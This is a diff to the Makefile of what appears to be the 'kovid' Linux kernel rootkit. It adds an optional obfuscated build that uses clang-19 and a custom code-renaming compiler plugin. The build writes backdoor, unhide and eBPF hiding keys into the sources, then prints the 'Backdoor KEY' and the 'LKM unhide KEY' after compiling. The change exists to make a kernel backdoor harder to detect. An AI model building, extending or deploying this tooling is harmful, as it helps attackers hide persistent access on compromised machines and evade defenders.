@@ -25,11 +25,20 @@ PRCTIMEOUT := 120
 EBPFHIDEKEY=0x7d3b1cb572f16426
 endif
 
+ifndef OBFUSCATE
 # PROCNAME, /proc/<name> interface.
 COMPILER_OPTIONS := -Wall -Wno-vla -DPROCNAME='"$(PROCNAME)"' \
 	-DMODNAME='"kovid"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK \
 	-DCPUHACK -DPRCTIMEOUT=$(PRCTIMEOUT) -DUUIDGEN=\"$(UUIDGEN)\" \
 	-DJOURNALCTL=\"$(JOURNALCTL)\"
+else
+CC=clang-19
+COMPILER_OPTIONS := -O2 -g -Wall -Wno-vla -DPROCNAME='"$(PROCNAME)"' \
+	-DMODNAME='"kovid"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK \
+	-DCPUHACK -DPRCTIMEOUT=$(PRCTIMEOUT) -DUUIDGEN=\"$(UUIDGEN)\" \
+	-DJOURNALCTL=\"$(JOURNALCTL)\" \
+	-fplugin="/usr/local/lib/KoviDRenameCodePlugin.so"
+endif
 
 EXTRA_CFLAGS := -I$(src)/src -I$(src)/fs ${COMPILER_OPTIONS}
 
@@ -47,9 +56,12 @@ $(OBJNAME)-objs = $(SRC:.c=.o)
 
 obj-m := ${OBJNAME}.o
 
+ifndef OBFUSCATE
 CC=gcc
+endif
 
 all:
+ifndef OBFUSCATE
 	# TODO: Check if we can generate a random PROCNAME, something like:
 	# PROCNAME ?= $(shell uuidgen | cut -c1-8)
 	$(if $(PROCNAME),,$(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name"))
@@ -57,6 +69,18 @@ all:
 	@sed -i "s/\(uint64_t auto_unhidekey = \)[^;]*;/\1$(UNHIDEKEY);/" src/kovid.c
 	@sed -i "s/\(uint64_t auto_ebpfhidenkey = \)[^;]*;/\1$(EBPFHIDEKEY);/" tools/ebpf/main.c
 	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+else
+	$(if $(PROCNAME),,$(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name"))
+	@sed -i "s/\(uint64_t auto_bdkey = \)[^;]*;/\1$(BDKEY);/" src/sock.c
+	@sed -i "s/\(uint64_t auto_unhidekey = \)[^;]*;/\1$(UNHIDEKEY);/" src/kovid.c
+	@sed -i "s/\(uint64_t auto_ebpfhidenkey = \)[^;]*;/\1$(EBPFHIDEKEY);/" tools/ebpf/main.c
+	make -C /lib/modules/6.8.0/build M=$(PWD) CC=clang-19 \
+        CONFIG_CC_IS_CLANG=1 \
+        KBUILD_CFLAGS="-O2 -Qunused-arguments -fno-integrated-as -Wno-error -fplugin=\"/usr/local/lib/KoviDRenameCodePlugin.so\"" \
+        KBUILD_CFLAGS_EXTRA="-fno-integrated-as -fgnu89-inline -Wno-error=asm -fsanitize=bounds" \
+        modules
+endif
+	@echo "Build complete."
 	@echo -n "Backdoor KEY: "
 	@echo "\033[1;37m$(BDKEY)\033[0m" | sed 's/0x//'
 	@echo -n "LKM unhide KEY: "
@@ -67,6 +91,12 @@ ifdef DEPLOY
 	@echo "\033[1;37mRELEASE\033[0m"
 else
 	@echo "\033[1;37mDEBUG\033[0m"
+endif
+	@echo -n "Obfuscate build: "
+ifdef OBFUSCATE
+	@echo "\033[1;37mYES\033[0m"
+else
+	@echo "\033[1;37mNO\033[0m"
 endif
 
 $(EBPF_BPF_OBJ): $(EBPF_C_SRC)
@@ -121,7 +151,11 @@ reset-auto:
 	@sed -i "s/\(uint64_t auto_ebpfhidenkey = \)[^;]*;/\10x0000000000000000;/" tools/ebpf/main.c
 
 clean: reset-auto
+ifndef OBFUSCATE
 	@make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+else
+	@make -C /lib/modules/6.8.0/build M=$(PWD) clean
+endif
 	@rm -f *.o src/*.o $(persist)
 	@echo "Clean."
 
